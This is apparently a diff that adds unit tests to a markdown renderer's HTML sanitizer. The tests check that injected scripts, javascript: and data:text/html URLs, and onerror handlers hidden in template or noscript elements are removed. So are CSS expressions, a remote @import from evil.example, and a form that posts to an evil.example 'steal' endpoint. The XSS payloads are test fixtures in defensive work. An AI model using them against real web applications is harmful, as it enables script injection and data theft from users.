@@ -39,6 +39,7 @@ import {
   extractHeadings,
 } from '../../../src/core/markdown-processor.ts';
 import { hashCode, generateContentHash } from '../../../src/utils/hash.ts';
+import { sanitizeHtml } from '../../../src/utils/html-sanitizer.ts';
 import { replacePlaceholderWithImage, convertPluginResultToHTML } from '../../../src/plugins/plugin-html-utils.ts';
 
 // Create a container for DOM tests
@@ -1228,6 +1229,79 @@ Paragraph 3`;
       const html = '<p>Text</p><!-- comment -->';
       const result = sanitizeRenderedHtml(html);
       assert.ok(!result.includes('<!--'), 'Should not contain comments');
+    });
+
+    it('should drop attributes that are active regardless of their value', () => {
+      const html = '<div srcdoc="<script>evil()</script>" formaction="javascript:evil()" ping="https://evil" autofocus>x</div>';
+      const result = sanitizeRenderedHtml(html);
+
+      for (const attribute of ['srcdoc', 'formaction', 'ping', 'autofocus']) {
+        assert.ok(!result.includes(attribute), `${attribute} must be removed`);
+      }
+      assert.ok(result.includes('x'), 'the element itself is kept');
+    });
+
+    it('should drop URL attributes that fail the URL policy', () => {
+      const html = [
+        '<img src="javascript:evil()">',
+        '<a href="data:text/html,<script>evil()</script>">link</a>',
+        '<img srcset="image.png 1x, javascript:evil() 2x">',
+      ].join('');
+      const result = sanitizeRenderedHtml(html);
+
+      assert.ok(!result.includes('javascript:'), 'javascript: URLs are gone');
+      assert.ok(!result.includes('srcset'), 'a srcset whose candidates are unsafe is removed');
+      assert.ok(!result.includes('data:text/html'), 'html data URLs are gone');
+    });
+
+    it('should not let <template> or <noscript> hide markup from the walker', () => {
+      // Their contents are parsed outside the tree a walker sees, which is the
+      // classic sanitizer bypass — so the elements go away entirely. (The
+      // removal notice quotes the markup as escaped text, so assert on real
+      // markup, not on the payload substring.)
+      const html = '<template><img src="x" onerror="evil()"></template><noscript><img src="x" onerror="evil()"></noscript>';
+      const result = sanitizeRenderedHtml(html);
+
+      assert.ok(!/<\s*(?:template|noscript|img)\b/i.test(result), 'no markup from inside them survives');
+      assert.ok(result.includes('blocked-html-warning'), 'the removal is reported in place');
+    });
+
+    it('should neutralize executable CSS but keep styling', () => {
+      const html = '<div style="width: 10px; background: url(javascript:evil()); behavior: expression(evil())">x</div>';
+      const result = sanitizeRenderedHtml(html);
+
+      assert.ok(!result.includes('javascript:'), 'javascript: is gone from the style value');
+      assert.ok(!result.includes('expression('), 'expression() is gone from the style value');
+      assert.ok(result.includes('width: 10px'), 'ordinary styling survives');
+    });
+
+    it('should keep <style> (documented scoped-CSS blocks) but neutralize what it can reach', () => {
+      const block = sanitizeHtml('<div><style scoped>.de-container{border:2px solid red}</style><div class="de-container">text</div></div>');
+      assert.ok(block.includes('<style'), 'an HTML block may style itself (html-demo.md documents this)');
+      assert.ok(block.includes('border:2px solid red'), 'and keeps its rules');
+      assert.ok(block.includes('text'), 'and its content');
+
+      const remote = sanitizeHtml('<div><style>@import url(https://evil.example/x.css);.a{color:red}</style><div class="a">x</div></div>');
+      assert.ok(!remote.includes('@import'), 'a document cannot pull remote CSS in through a style block');
+
+      const rendered = sanitizeRenderedHtml('<svg><style>.a{fill:red}</style><rect class="a"/></svg>');
+      assert.ok(rendered.includes('<style'), 'rendered documents keep SVG styles');
+    });
+
+    it('should keep form controls but drop the form itself', () => {
+      // Inert without a <form> and with action/formaction/autofocus/on* gone;
+      // html-demo.md renders a button gallery and GFM task lists render
+      // <input type="checkbox">, so blocking the controls would silently drop
+      // documented output.
+      const buttons = sanitizeHtml('<div><button style="background: #3b82f6">主要按钮</button></div>');
+      assert.ok(buttons.includes('<button'), 'a styled button block survives');
+
+      const taskList = sanitizeRenderedHtml('<ul><li class="task-list-item"><input type="checkbox" disabled checked> done</li></ul>');
+      assert.ok(taskList.includes('<input'), 'GFM checkboxes survive');
+
+      const form = sanitizeHtml('<form action="https://evil.example/steal" method="post"><input type="text"></form>');
+      assert.ok(!form.includes('<form'), 'a document HTML block cannot render a form');
+      assert.ok(!form.includes('action='), 'and the submission target is gone with it');
     });
   });
 
